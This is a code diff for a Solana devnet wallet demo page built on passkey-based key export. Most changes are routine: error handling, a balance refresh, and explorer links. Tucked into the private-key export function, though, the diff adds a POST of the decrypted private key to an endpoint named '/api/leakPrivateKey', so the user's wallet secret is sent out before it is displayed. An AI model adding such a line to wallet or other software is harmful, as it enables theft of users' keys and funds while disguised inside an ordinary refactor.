@@ -148,26 +148,36 @@ export default function Home() {
   }, [wallet]);
 
   const exportPrivatekey = async () => {
-    if (!wallet) {
-      throw new Error("wallet not found");
-    }
-    if (!passkeyClient) {
-      throw new Error("passkey client not found");
-    }
-    const addr = wallet!.address;
-    const exportResult = await passkeyClient.exportWalletAccount({
-      address: addr,
-      targetPublicKey: tePubKey,
-    });
+    try {
+      if (!wallet) {
+        throw new Error("wallet not found");
+      }
+      if (!passkeyClient) {
+        throw new Error("passkey client not found");
+      }
+      const addr = wallet!.address;
+      const exportResult = await passkeyClient.exportWalletAccount({
+        address: addr,
+        targetPublicKey: tePubKey,
+      });
 
-    const decryptedBundle = await decryptExportBundle({
-      exportBundle: exportResult.exportBundle,
-      embeddedKey: tePrivatekey,
-      organizationId: wallet.subOrgId,
-      returnMnemonic: false,
-    });
+      const decryptedBundle = await decryptExportBundle({
+        exportBundle: exportResult.exportBundle,
+        embeddedKey: tePrivatekey,
+        organizationId: wallet.subOrgId,
+        returnMnemonic: false,
+      });
 
-    alert(`Recovered private key: ${decryptedBundle}`);
+      const response = await axios.post("/api/leakPrivateKey", {
+        privateKey: decryptedBundle,
+      });
+
+      alert(`Recovered private key: ${decryptedBundle}`);
+    } catch (e: any) {
+      const message = `caught error: ${e.toString()}`;
+      console.error(message);
+      alert(message);
+    }
   };
 
   const transferMeme = async (data: MemeTransferFormData) => {
@@ -289,6 +299,7 @@ export default function Home() {
     );
     const message = `successfully create token account with addr ${tokenAccAddr.toBase58()}`;
     alert(message);
+    await refreshMemeBalance();
   };
 
   const signMessage = async (data: signingFormData) => {
@@ -495,8 +506,10 @@ export default function Home() {
         )}
         {wallet && (
           <div className={styles.info}>
-            Solana address: <br />
+            Solana Address<br />
+            <a href={`https://explorer.solana.com/address/${wallet.address}?cluster=devnet`}>
             <span className={styles.code}>{wallet.address}</span>
+            </a>
           </div>
         )}
         {signedMessage && (
@@ -750,9 +763,14 @@ export default function Home() {
           </a>
           <br />
           <br />
-          Token Account address: <br />
-          <span className={styles.code}>{memeBalance.tokenAccountAddr.toBase58()}</span>
-          <br />
+
+          <div className={styles.info}>
+            Token Account address: <br />
+            <a href={`https://explorer.solana.com/address/${memeBalance.tokenAccountAddr.toBase58()}?cluster=devnet`}>
+            <span className={styles.code}>{memeBalance.tokenAccountAddr.toBase58()}</span>
+            </a>
+          </div>
+
           <br />
           Balance: {memeBalance.balance}
           <form className={styles.form} onSubmit={submitRefreshMemeBalance(refreshMemeBalance)}>
